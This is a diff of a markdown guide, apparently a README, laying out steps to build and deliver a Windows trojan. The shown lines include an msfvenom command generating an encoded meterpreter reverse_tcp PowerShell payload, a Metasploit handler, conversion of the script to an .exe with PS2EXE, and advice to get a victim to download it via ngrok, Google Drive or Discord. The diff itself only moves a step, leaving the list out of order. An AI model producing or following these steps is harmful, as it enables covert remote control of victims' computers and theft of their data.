@@ -4,7 +4,6 @@
 
 ## Steps to Compromise:
 
-1. **Setup Trojan Horse.** 
 3. **Generate the payload:** <br>
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -i 2 -e cmd/powershell_base64 -f ps1
@@ -24,6 +23,7 @@ msf exploit(handler) > exploit <br>
 trojan.ps1 <br>
 7. **Convert our encoded trojan.ps1 into .exe using PS2EXE.** <br>
 encoded_trojan.ps1
+1. **Setup Trojan Horse.** 
 8. **Get creative. Have victim download "exe" file to their machine (i.e through ngrok server, google drive, discord, or other means.)**
 
 # Demonstration Video
